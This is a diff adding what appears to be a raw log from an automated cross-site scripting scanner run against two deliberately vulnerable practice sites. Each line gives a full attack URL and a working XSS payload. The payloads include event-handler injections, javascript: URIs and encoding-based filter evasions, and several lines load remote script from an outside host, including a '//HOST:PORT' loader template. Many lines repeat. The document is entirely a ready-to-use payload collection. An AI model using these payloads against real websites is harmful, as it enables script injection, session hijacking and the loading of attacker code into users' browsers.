@@ -1,0 +1,289 @@
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query="-prompt(8)-" with payload: "-prompt(8)-"
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query='-prompt(8)-' with payload: '-prompt(8)-'
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query="onclick=prompt(8)>"@x.y with payload: "onclick=prompt(8)>"@x.y
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query="onclick=prompt(8)><svg/onload=prompt(8)>"@x.y with payload: "onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<image/src/onerror=prompt(8)> with payload: <image/src/onerror=prompt(8)>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<img/src/onerror=prompt(8)> with payload: <img/src/onerror=prompt(8)>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<image src/onerror=prompt(8)> with payload: <image src/onerror=prompt(8)>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<img src/onerror=prompt(8)> with payload: <img src/onerror=prompt(8)>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<image src =q onerror=prompt(8)> with payload: <image src =q onerror=prompt(8)>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<img src =q onerror=prompt(8)> with payload: <img src =q onerror=prompt(8)>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=</scrip</script>t><img src =q onerror=prompt(8)> with payload: </scrip</script>t><img src =q onerror=prompt(8)>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<svg onload=alert(1)> with payload: <svg onload=alert(1)>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query="><svg onload=alert(1)// with payload: "><svg onload=alert(1)//
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query="onmouseover=alert(1)// with payload: "onmouseover=alert(1)//
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query="autofocus/onfocus=alert(1)// with payload: "autofocus/onfocus=alert(1)//
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query='-alert(1)-' with payload: '-alert(1)-'
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query='-alert(1)// with payload: '-alert(1)//
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=\'-alert(1)// with payload: \'-alert(1)//
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=</script><svg onload=alert(1)> with payload: </script><svg onload=alert(1)>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<x contenteditable onblur=alert(1)>lose focus! with payload: <x contenteditable onblur=alert(1)>lose focus!
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<x onclick=alert(1)>click this! with payload: <x onclick=alert(1)>click this!
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<x oncopy=alert(1)>copy this! with payload: <x oncopy=alert(1)>copy this!
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<x oncontextmenu=alert(1)>right click this! with payload: <x oncontextmenu=alert(1)>right click this!
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<x oncut=alert(1)>copy this! with payload: <x oncut=alert(1)>copy this!
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<x ondblclick=alert(1)>double click this! with payload: <x ondblclick=alert(1)>double click this!
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<x ondrag=alert(1)>drag this! with payload: <x ondrag=alert(1)>drag this!
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<x contenteditable onfocus=alert(1)>focus this! with payload: <x contenteditable onfocus=alert(1)>focus this!
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<x contenteditable oninput=alert(1)>input here! with payload: <x contenteditable oninput=alert(1)>input here!
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<x contenteditable onkeydown=alert(1)>press any key! with payload: <x contenteditable onkeydown=alert(1)>press any key!
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<x contenteditable onkeypress=alert(1)>press any key! with payload: <x contenteditable onkeypress=alert(1)>press any key!
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<x contenteditable onkeyup=alert(1)>press any key! with payload: <x contenteditable onkeyup=alert(1)>press any key!
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<x onmousedown=alert(1)>click this! with payload: <x onmousedown=alert(1)>click this!
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<x onmousemove=alert(1)>hover this! with payload: <x onmousemove=alert(1)>hover this!
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<x onmouseout=alert(1)>hover this! with payload: <x onmouseout=alert(1)>hover this!
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<x onmouseover=alert(1)>hover this! with payload: <x onmouseover=alert(1)>hover this!
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<x onmouseup=alert(1)>click this! with payload: <x onmouseup=alert(1)>click this!
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<x contenteditable onpaste=alert(1)>paste here! with payload: <x contenteditable onpaste=alert(1)>paste here!
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<script>alert(1)// with payload: <script>alert(1)//
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<script>alert(1)<!– with payload: <script>alert(1)<!–
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<script src=//brutelogic.com.br/1.js> with payload: <script src=//brutelogic.com.br/1.js>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<script src=//3334957647/1> with payload: <script src=//3334957647/1>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<X onxxx=1 with payload: <X onxxx=1
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<x OnXxx=1 with payload: <x OnXxx=1
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<X OnXxx=1 with payload: <X OnXxx=1
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<x onxxx=1 onxxx=1 with payload: <x onxxx=1 onxxx=1
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<x/onxxx=1 with payload: <x/onxxx=1
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<x 1='1'onxxx=1 with payload: <x 1='1'onxxx=1
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<x 1="1"onxxx=1 with payload: <x 1="1"onxxx=1
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<x </onxxx=1 with payload: <x </onxxx=1
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<x 1=">" onxxx=1 with payload: <x 1=">" onxxx=1
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<x onxxx=alert(1) 1=' with payload: <x onxxx=alert(1) 1='
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)> with payload: <svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query='onload=alert(1)><svg/1=' with payload: 'onload=alert(1)><svg/1='
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query='>alert(1)</script><script/1=' with payload: '>alert(1)</script><script/1='
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=*/alert(1)</script><script>/* with payload: */alert(1)</script><script>/*
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=*/alert(1)">'onload="/*<svg/1=' with payload: */alert(1)">'onload="/*<svg/1='
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=`-alert(1)">'onload="`<svg/1=' with payload: `-alert(1)">'onload="`<svg/1='
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=*/</script>'>alert(1)/*<script/1=' with payload: */</script>'>alert(1)/*<script/1='
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<script>alert(1)</script> with payload: <script>alert(1)</script>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<script src=javascript:alert(1)> with payload: <script src=javascript:alert(1)>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<iframe src=javascript:alert(1)> with payload: <iframe src=javascript:alert(1)>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<embed src=javascript:alert(1)> with payload: <embed src=javascript:alert(1)>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<a href=javascript:alert(1)>click with payload: <a href=javascript:alert(1)>click
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<math><brute href=javascript:alert(1)>click with payload: <math><brute href=javascript:alert(1)>click
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<form action=javascript:alert(1)><input type=submit> with payload: <form action=javascript:alert(1)><input type=submit>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<isindex action=javascript:alert(1) type=submit value=click> with payload: <isindex action=javascript:alert(1) type=submit value=click>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<form><button formaction=javascript:alert(1)>click with payload: <form><button formaction=javascript:alert(1)>click
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<form><input formaction=javascript:alert(1) type=submit value=click> with payload: <form><input formaction=javascript:alert(1) type=submit value=click>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<form><input formaction=javascript:alert(1) type=image value=click> with payload: <form><input formaction=javascript:alert(1) type=image value=click>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<form><input formaction=javascript:alert(1) type=image src=SOURCE> with payload: <form><input formaction=javascript:alert(1) type=image src=SOURCE>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<isindex formaction=javascript:alert(1) type=submit value=click> with payload: <isindex formaction=javascript:alert(1) type=submit value=click>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<object data=javascript:alert(1)> with payload: <object data=javascript:alert(1)>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<svg><script xlink:href=data:,alert(1) /> with payload: <svg><script xlink:href=data:,alert(1) />
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<math><brute xlink:href=javascript:alert(1)>click with payload: <math><brute xlink:href=javascript:alert(1)>click
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<html ontouchstart=alert(1)> with payload: <html ontouchstart=alert(1)>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<html ontouchend=alert(1)> with payload: <html ontouchend=alert(1)>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<html ontouchmove=alert(1)> with payload: <html ontouchmove=alert(1)>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<html ontouchcancel=alert(1)> with payload: <html ontouchcancel=alert(1)>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<body onorientationchange=alert(1)> with payload: <body onorientationchange=alert(1)>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query="><img src=1 onerror=alert(1)>.gif with payload: "><img src=1 onerror=alert(1)>.gif
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/> with payload: <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<base href=//0> with payload: <base href=//0>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<body onload=alert(1)> with payload: <body onload=alert(1)>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<body onpageshow=alert(1)> with payload: <body onpageshow=alert(1)>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<body onfocus=alert(1)> with payload: <body onfocus=alert(1)>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<body onscroll=alert(1)><br><br><br><br> with payload: <body onscroll=alert(1)><br><br><br><br>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<br><br><br><br><br><br><br><br><br><br> with payload: <br><br><br><br><br><br><br><br><br><br>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<br><br><br><br><br><br><br><br><br><br> with payload: <br><br><br><br><br><br><br><br><br><br>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<body onresize=alert(1)>press F12! with payload: <body onresize=alert(1)>press F12!
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<body onhelp=alert(1)>press F1! (MSIE) with payload: <body onhelp=alert(1)>press F1! (MSIE)
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<marquee onstart=alert(1)> with payload: <marquee onstart=alert(1)>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<marquee loop=1 width=0 onfinish=alert(1)> with payload: <marquee loop=1 width=0 onfinish=alert(1)>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<audio src onloadstart=alert(1)> with payload: <audio src onloadstart=alert(1)>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<video onloadstart=alert(1)><source> with payload: <video onloadstart=alert(1)><source>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<input autofocus onblur=alert(1)> with payload: <input autofocus onblur=alert(1)>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<keygen autofocus onfocus=alert(1)> with payload: <keygen autofocus onfocus=alert(1)>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<form onsubmit=alert(1)><input type=submit> with payload: <form onsubmit=alert(1)><input type=submit>
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<select onchange=alert(1)><option>1<option>2 with payload: <select onchange=alert(1)><option>1<option>2
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=<menu id=x contextmenu=x onshow=alert(1)>right click me! with payload: <menu id=x contextmenu=x onshow=alert(1)>right click me!
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=alert`1` with payload: alert`1`
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=(alert)(1) with payload: (alert)(1)
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=a=alert,a(1) with payload: a=alert,a(1)
+Vulnerability found in link at https://xss-game.appspot.com/level1/frame?query=[1].find(alert) with payload: [1].find(alert)
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cscript%3Ealert%28%22hi%22%29%3B%3C%2Fscript%3E with payload: <script>alert("hi");</script>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%22-prompt%288%29-%22 with payload: "-prompt(8)-"
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%27-prompt%288%29-%27 with payload: '-prompt(8)-'
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%22%3Ba%3Dprompt%2Ca%28%29%2F%2F with payload: ";a=prompt,a()//
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%27%3Ba%3Dprompt%2Ca%28%29%2F%2F with payload: ';a=prompt,a()//
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%27-eval%28%22window%5B%27pro%27%252B%27mpt%27%5D%288%29%22%29-%27 with payload: '-eval("window['pro'%2B'mpt'](8)")-'
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%22-eval%28%22window%5B%27pro%27%252B%27mpt%27%5D%288%29%22%29-%22 with payload: "-eval("window['pro'%2B'mpt'](8)")-"
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%22onclick%3Dprompt%288%29%3E%22%40x.y with payload: "onclick=prompt(8)>"@x.y
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%22onclick%3Dprompt%288%29%3E%3Csvg%2Fonload%3Dprompt%288%29%3E%22%40x.y with payload: "onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cimage%2Fsrc%2Fonerror%3Dprompt%288%29%3E with payload: <image/src/onerror=prompt(8)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cimg%2Fsrc%2Fonerror%3Dprompt%288%29%3E with payload: <img/src/onerror=prompt(8)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cimage+src%2Fonerror%3Dprompt%288%29%3E with payload: <image src/onerror=prompt(8)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cimg+src%2Fonerror%3Dprompt%288%29%3E with payload: <img src/onerror=prompt(8)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cimage+src+%3Dq+onerror%3Dprompt%288%29%3E with payload: <image src =q onerror=prompt(8)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cimg+src+%3Dq+onerror%3Dprompt%288%29%3E with payload: <img src =q onerror=prompt(8)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3C%2Fscrip%3C%2Fscript%3Et%3E%3Cimg+src+%3Dq+onerror%3Dprompt%288%29%3E with payload: </scrip</script>t><img src =q onerror=prompt(8)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Csvg+onload%3Dalert%281%29%3E with payload: <svg onload=alert(1)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%22%3E%3Csvg+onload%3Dalert%281%29%2F%2F with payload: "><svg onload=alert(1)//
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%22onmouseover%3Dalert%281%29%2F%2F with payload: "onmouseover=alert(1)//
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%22autofocus%2Fonfocus%3Dalert%281%29%2F%2F with payload: "autofocus/onfocus=alert(1)//
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%27-alert%281%29-%27 with payload: '-alert(1)-'
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%27-alert%281%29%2F%2F with payload: '-alert(1)//
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%5C%27-alert%281%29%2F%2F with payload: \'-alert(1)//
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3C%2Fscript%3E%3Csvg+onload%3Dalert%281%29%3E with payload: </script><svg onload=alert(1)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+contenteditable+onblur%3Dalert%281%29%3Elose+focus%21 with payload: <x contenteditable onblur=alert(1)>lose focus!
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+onclick%3Dalert%281%29%3Eclick+this%21 with payload: <x onclick=alert(1)>click this!
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+oncopy%3Dalert%281%29%3Ecopy+this%21 with payload: <x oncopy=alert(1)>copy this!
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+oncontextmenu%3Dalert%281%29%3Eright+click+this%21 with payload: <x oncontextmenu=alert(1)>right click this!
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+oncut%3Dalert%281%29%3Ecopy+this%21 with payload: <x oncut=alert(1)>copy this!
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+ondblclick%3Dalert%281%29%3Edouble+click+this%21 with payload: <x ondblclick=alert(1)>double click this!
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+ondrag%3Dalert%281%29%3Edrag+this%21 with payload: <x ondrag=alert(1)>drag this!
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+contenteditable+onfocus%3Dalert%281%29%3Efocus+this%21 with payload: <x contenteditable onfocus=alert(1)>focus this!
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+contenteditable+oninput%3Dalert%281%29%3Einput+here%21 with payload: <x contenteditable oninput=alert(1)>input here!
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cscript%3Ealert%28%22hi%22%29%3B%3C%2Fscript%3E with payload: <script>alert("hi");</script>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%22-prompt%288%29-%22 with payload: "-prompt(8)-"
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%27-prompt%288%29-%27 with payload: '-prompt(8)-'
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%22%3Ba%3Dprompt%2Ca%28%29%2F%2F with payload: ";a=prompt,a()//
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%27%3Ba%3Dprompt%2Ca%28%29%2F%2F with payload: ';a=prompt,a()//
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%27-eval%28%22window%5B%27pro%27%252B%27mpt%27%5D%288%29%22%29-%27 with payload: '-eval("window['pro'%2B'mpt'](8)")-'
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%22-eval%28%22window%5B%27pro%27%252B%27mpt%27%5D%288%29%22%29-%22 with payload: "-eval("window['pro'%2B'mpt'](8)")-"
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%22onclick%3Dprompt%288%29%3E%22%40x.y with payload: "onclick=prompt(8)>"@x.y
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%22onclick%3Dprompt%288%29%3E%3Csvg%2Fonload%3Dprompt%288%29%3E%22%40x.y with payload: "onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cimage%2Fsrc%2Fonerror%3Dprompt%288%29%3E with payload: <image/src/onerror=prompt(8)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cimg%2Fsrc%2Fonerror%3Dprompt%288%29%3E with payload: <img/src/onerror=prompt(8)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cimage+src%2Fonerror%3Dprompt%288%29%3E with payload: <image src/onerror=prompt(8)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cimg+src%2Fonerror%3Dprompt%288%29%3E with payload: <img src/onerror=prompt(8)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cimage+src+%3Dq+onerror%3Dprompt%288%29%3E with payload: <image src =q onerror=prompt(8)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cimg+src+%3Dq+onerror%3Dprompt%288%29%3E with payload: <img src =q onerror=prompt(8)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3C%2Fscrip%3C%2Fscript%3Et%3E%3Cimg+src+%3Dq+onerror%3Dprompt%288%29%3E with payload: </scrip</script>t><img src =q onerror=prompt(8)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Csvg+onload%3Dalert%281%29%3E with payload: <svg onload=alert(1)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%22%3E%3Csvg+onload%3Dalert%281%29%2F%2F with payload: "><svg onload=alert(1)//
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%22onmouseover%3Dalert%281%29%2F%2F with payload: "onmouseover=alert(1)//
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%22autofocus%2Fonfocus%3Dalert%281%29%2F%2F with payload: "autofocus/onfocus=alert(1)//
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%27-alert%281%29-%27 with payload: '-alert(1)-'
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%27-alert%281%29%2F%2F with payload: '-alert(1)//
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%5C%27-alert%281%29%2F%2F with payload: \'-alert(1)//
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3C%2Fscript%3E%3Csvg+onload%3Dalert%281%29%3E with payload: </script><svg onload=alert(1)>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+contenteditable+onblur%3Dalert%281%29%3Elose+focus%21 with payload: <x contenteditable onblur=alert(1)>lose focus!
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+onclick%3Dalert%281%29%3Eclick+this%21 with payload: <x onclick=alert(1)>click this!
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+oncopy%3Dalert%281%29%3Ecopy+this%21 with payload: <x oncopy=alert(1)>copy this!
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+oncontextmenu%3Dalert%281%29%3Eright+click+this%21 with payload: <x oncontextmenu=alert(1)>right click this!
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+oncut%3Dalert%281%29%3Ecopy+this%21 with payload: <x oncut=alert(1)>copy this!
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+ondblclick%3Dalert%281%29%3Edouble+click+this%21 with payload: <x ondblclick=alert(1)>double click this!
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+ondrag%3Dalert%281%29%3Edrag+this%21 with payload: <x ondrag=alert(1)>drag this!
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+contenteditable+onfocus%3Dalert%281%29%3Efocus+this%21 with payload: <x contenteditable onfocus=alert(1)>focus this!
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+contenteditable+oninput%3Dalert%281%29%3Einput+here%21 with payload: <x contenteditable oninput=alert(1)>input here!
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+contenteditable+onkeydown%3Dalert%281%29%3Epress+any+key%21 with payload: <x contenteditable onkeydown=alert(1)>press any key!
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+contenteditable+onkeypress%3Dalert%281%29%3Epress+any+key%21 with payload: <x contenteditable onkeypress=alert(1)>press any key!
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+contenteditable+onkeyup%3Dalert%281%29%3Epress+any+key%21 with payload: <x contenteditable onkeyup=alert(1)>press any key!
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+onmousedown%3Dalert%281%29%3Eclick+this%21 with payload: <x onmousedown=alert(1)>click this!
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+onmousemove%3Dalert%281%29%3Ehover+this%21 with payload: <x onmousemove=alert(1)>hover this!
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+onmouseout%3Dalert%281%29%3Ehover+this%21 with payload: <x onmouseout=alert(1)>hover this!
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+onmouseover%3Dalert%281%29%3Ehover+this%21 with payload: <x onmouseover=alert(1)>hover this!
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+onmouseup%3Dalert%281%29%3Eclick+this%21 with payload: <x onmouseup=alert(1)>click this!
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+contenteditable+onpaste%3Dalert%281%29%3Epaste+here%21 with payload: <x contenteditable onpaste=alert(1)>paste here!
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cscript%3Ealert%281%29%2F%2F with payload: <script>alert(1)//
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cscript%3Ealert%281%29%3C%21%E2%80%93 with payload: <script>alert(1)<!–
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cscript+src%3D%2F%2Fbrutelogic.com.br%2F1.js%3E with payload: <script src=//brutelogic.com.br/1.js>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cscript+src%3D%2F%2F3334957647%2F1%3E with payload: <script src=//3334957647/1>
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%253Cx+onxxx%3Dalert%281%29 with payload: %3Cx onxxx=alert(1)
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3C%2578+onxxx%3D1 with payload: <%78 onxxx=1
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+%256Fnxxx%3D1 with payload: <x %6Fnxxx=1
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+o%256Exxx%3D1 with payload: <x o%6Exxx=1
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+on%2578xx%3D1 with payload: <x on%78xx=1
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+onxxx%253D1 with payload: <x onxxx%3D1
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3CX+onxxx%3D1 with payload: <X onxxx=1
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+OnXxx%3D1 with payload: <x OnXxx=1
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3CX+OnXxx%3D1 with payload: <X OnXxx=1
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+onxxx%3D1+onxxx%3D1 with payload: <x onxxx=1 onxxx=1
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx%2Fonxxx%3D1 with payload: <x/onxxx=1
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx%2509onxxx%3D1 with payload: <x%09onxxx=1
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx%250Aonxxx%3D1 with payload: <x%0Aonxxx=1
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx%250Conxxx%3D1 with payload: <x%0Conxxx=1
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx%250Donxxx%3D1 with payload: <x%0Donxxx=1
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx%252Fonxxx%3D1 with payload: <x%2Fonxxx=1
+Vulnerability found in link at https://sudo.co.il/xss/level0.php?email=%3Cx+1%3D%271%27onxxx%3D1 with payload: <x 1='1'onxxx=1
